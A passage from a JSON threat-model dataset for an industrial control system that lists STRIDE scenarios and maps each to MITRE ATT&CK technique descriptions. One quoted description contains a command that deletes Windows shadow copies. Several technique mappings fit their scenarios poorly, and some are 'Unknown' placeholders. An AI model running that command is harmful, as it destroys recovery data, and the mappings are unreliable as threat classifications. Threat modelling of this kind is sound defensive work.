                    "Condition": "The network lacks adequate monitoring and detection mechanisms."
                }
            ],
            "Potential Impact": "Potential compromise of operational strategies and competitive advantage.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "plain text communication",
                "network eavesdropping"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Leaked access credentials for cloud services accessed by external malicious actors.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not securely managed",
                    "Role": "Systems Administrator",
                    "Condition": "Credentials are stored in an insecure manner."
                },
                {
                    "Assumption": "Failed multi-factor authentication implementation",
                    "Role": "Security Architect",
                    "Condition": "Single-factor authentication is used for critical services."
                }
            ],
            "Potential Impact": "Exposure of sensitive data and potential misuse of cloud resources.",
            "MITRE ATT&CK Keywords": [
                "credential leakage",
                "cloud service exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insider threat exposing proprietary process information stored in MES database.",
            "Assumptions": [
                {
                    "Assumption": "Excessive permissions granted to users",
                    "Role": "Database Administrator",
                    "Condition": "Users have more access than required for their role."
                },
                {
                    "Assumption": "Lack of data access monitoring",
                    "Role": "Security Operations Center",
                    "Condition": "Access to sensitive data is not monitored adequately."
                }
            ],
            "Potential Impact": "Loss of intellectual property and competitive harm to the organization.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data exfiltration",
                "database access"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the Control Center disrupts communications with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "No traffic filtering or rate-limiting at the network edge",
                    "Role": "Network Administrator",
                    "Condition": "No defenses against high-volume traffic attacks are in place."
                },
                {
                    "Assumption": "Dependence on a single communication channel",
                    "Role": "Network Architect",
                    "Condition": "Communications are not redundantly configured."
                }
            ],
            "Potential Impact": "Loss of control over field devices leading to potential production halts.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flooding",
                "communications disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection causes the MES system to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "End-point protection is insufficient",
                    "Role": "IT Security",
                    "Condition": "Anti-malware protections and updates are not enforced."
                },
                {
                    "Assumption": "No segmentation between MES and other systems",
                    "Role": "Network Administrator",
                    "Condition": "MES is directly exposed to other systems without isolation."
                }
            ],
            "Potential Impact": "Operational workflow interruptions affecting production scheduling and tracking.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "system unavailability",
                "production disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource exhaustion at the gateway due to a high volume of unsolicited data.",
            "Assumptions": [
                {
                    "Assumption": "No resource management controls in place",
                    "Role": "System Architect",
                    "Condition": "Resource usage is not actively managed or monitored."
                },
                {
                    "Assumption": "Unrestricted data flows from field devices",
                    "Role": "Field Device Manufacturer",
                    "Condition": "Field devices send data without rate control."
                }
            ],
            "Potential Impact": "Non-availability of gateway services affecting system-wide operations.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "gateway overload",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider gains administrative privileges on the Control Center's HMI.",
            "Assumptions": [
                {
                    "Assumption": "Role-based access controls are improperly configured",
                    "Role": "Security Administrator",
                    "Condition": "Users can elevate their privileges without checks."
                },
                {
                    "Assumption": "No monitoring of administrative actions",
                    "Role": "Security Operations Center",
                    "Condition": "Actions of privileged accounts are not scrutinized."
                }
            ],
            "Potential Impact": "Unauthorized changes to control commands and monitoring systems.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "HMI manipulation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "External attacker exploits a vulnerability in the gateway to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Gateway software has unpatched vulnerabilities",
                    "Role": "Systems Administrator",
                    "Condition": "Security patches and updates are not applied."
                },
                {
                    "Assumption": "Insufficient network security configurations",
                    "Role": "Network Administrator",
                    "Condition": "Gateway is inadequately defended against external access."
                }
            ],
            "Potential Impact": "Control over data processes and potential tampering with transmitted information.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "gateway compromise",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware installs itself with system-level privileges on cloud services used for data processing.",
            "Assumptions": [
                {
                    "Assumption": "Cloud workflows lack privilege separation",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Processes run with excessive privileges."
                },
                {
                    "Assumption": "Inadequate malware protection in cloud environment",
                    "Role": "IT Security",
                    "Condition": "Cloud environment is not equipped with robust anti-malware measures."
                }
            ],
            "Potential Impact": "Full control over data processing tasks and potential data corruption or theft.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "cloud privilege abuse",
                "data processing manipulation"
            ],
            "mitre_technique": {
                "name": "Serverless",
                "description": "Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
                "id": "attack-pattern--04a5a8ab-3bc8-4c83-95c9-55274a89786d",
                "technique_id": "T1583.007"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates an RTU within the SCADA system to send unauthorized control commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network where RTUs communicate.",
                    "Role": "Attacker",
                    "Condition": "Insider threat or external breach of the network."
                },
                {
                    "Assumption": "The RTUs do not sufficiently authenticate communications.",
                    "Role": "System Designer",
                    "Condition": "Lack of or weak authentication mechanisms."
                },
                {
                    "Assumption": "The communication protocol does not inherently prevent spoofing.",
                    "Role": "Protocol Designer",
                    "Condition": "Protocol vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized control commands could be issued, leading to potential data corruption and disruption of the manufacturing process.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Impersonation",
                "Network",
                "RTU"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised employee's credentials to access the Control Center HMI.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has stolen valid credentials.",
                    "Role": "Attacker",
                    "Condition": "Phishing attack or insider threat."
                },
                {
                    "Assumption": "The HMI does not use multi-factor authentication.",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication is in place."
                },
                {
                    "Assumption": "The attacker can bypass network monitoring to use the credentials.",
                    "Role": "Attacker",
                    "Condition": "Lack of advanced network monitoring."
                }
            ],
            "Potential Impact": "The attacker could alter control settings, disrupt operations, and compromise sensitive data integrity.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Credentials",
                "HMI",
                "Control Center"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker disguises their device as a legitimate PLC to intercept and alter data in transit.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to mimic device addresses.",
                    "Role": "Attacker",
                    "Condition": "Physical access or network breach."
                },
                {
                    "Assumption": "The protocol used for PLC communication does not authenticate the sending device.",
                    "Role": "Protocol Designer",
                    "Condition": "Weakness in the communication protocol."
                },
                {
                    "Assumption": "Field devices do not verify the identity of sending devices.",
                    "Role": "System Administrator",
                    "Condition": "Lack of device authentication."
                }
            ],
            "Potential Impact": "The integrity of data transmitted to/from the PLC could be compromised, leading to erroneous control actions.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Device",
                "PLC",
                "Data Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware on a PLC to alter its behavior without detection.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the PLC firmware update process.",
                    "Role": "Attacker",
                    "Condition": "Obtained through physical access or exploitation."
                },
                {
                    "Assumption": "Firmware updates are not sufficiently validated or authenticated.",
                    "Role": "System Administrator",
                    "Condition": "Lack of proper firmware validation processes."
                },
                {
                    "Assumption": "The PLC does not use secure boot mechanisms.",
                    "Role": "Hardware Designer",
                    "Condition": "No secure boot in place."
                }
            ],
            "Potential Impact": "The program logic could be altered, leading to unsafe operations and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware",
                "PLC",
                "Behavior Modification"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies control commands between the Control Center and RTUs.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is unencrypted or weakly encrypted.",
                    "Role": "System Architect",
                    "Condition": "Insecure communication protocols."
                },
                {
                    "Assumption": "The attacker has network access to intercept traffic.",
                    "Role": "Attacker",
                    "Condition": "Compromised network infrastructure."
                },
                {
                    "Assumption": "There is no integrity check on control commands.",
                    "Role": "System Designer",
                    "Condition": "Lack of integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Altered control commands could lead to malfunctioning devices and process disruptions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Interception",
                "Control Commands",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters sensor data being sent to RTUs, skewing analytics and operational decisions.",
            "Assumptions": [
                {
                    "Assumption": "Sensors transmit data through an insecure channel.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption in sensor data channels."
                },
                {
                    "Assumption": "The attacker has access to the communication path of the sensors.",
                    "Role": "Attacker",
                    "Condition": "Network access privilege."
                },
                {
                    "Assumption": "There are no integrity checks on incoming sensor data.",
                    "Role": "System Designer",
                    "Condition": "Lack of data integrity controls."
                }
            ],
            "Potential Impact": "Misleading data could result in suboptimal or dangerous operational decisions and analysis.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data",
                "Sensor",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized change to production parameters in the MES is challenged, and there is no log to trace the change.",
            "Assumptions": [
                {
                    "Assumption": "Change logging is either absent or inadequate.",
                    "Role": "System Auditor",
                    "Condition": "Lack of comprehensive logging."
                },
                {
                    "Assumption": "Access controls are not properly enforced.",
                    "Role": "System Administrator",
                    "Condition": "Ineffective or non-existent access controls."
                },
                {
                    "Assumption": "The MES system does not verify or log all changes.",
                    "Role": "System Designer",
                    "Condition": "Insufficient change verification mechanisms."
                }
            ],
            "Potential Impact": "Repudiation may allow malicious changes to go undetected, leading to potential data corruption and process inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "MES",
                "Logging",
                "Production Parameters"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a critical command from the HMI because there is no non-repudiation control in place.",
            "Assumptions": [
                {
                    "Assumption": "The system does not track command origination with timestamps and credentials.",
                    "Role": "System Designer",
                    "Condition": "Lack of origin tracking."
                },
                {
                    "Assumption": "The HMI does not enforce non-repudiation measures.",
                    "Role": "System Administrator",
                    "Condition": "No non-repudiation controls in HMI."
                },
                {
                    "Assumption": "Incident response lacks the ability to trace actions accurately.",
                    "Role": "Security Team",
                    "Condition": "Ineffective incident response capability."
                }
            ],
            "Potential Impact": "Critical actions attributed to the wrong user may result in operational follow-through issues and potential data integrity damage.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "HMI",
                "Commands",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Windows Management Instrumentation",
                "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
                "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
                "technique_id": "T1047"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Conflicting data entries in the ERP system are discovered, and users deny responsibility.",
            "Assumptions": [
                {
                    "Assumption": "User actions leading to data entry are not logged or audited.",
                    "Role": "System Auditor",
                    "Condition": "Absence of audit trails."
                },
                {
                    "Assumption": "Access control to ERP data entries is weak.",
                    "Role": "System Administrator",
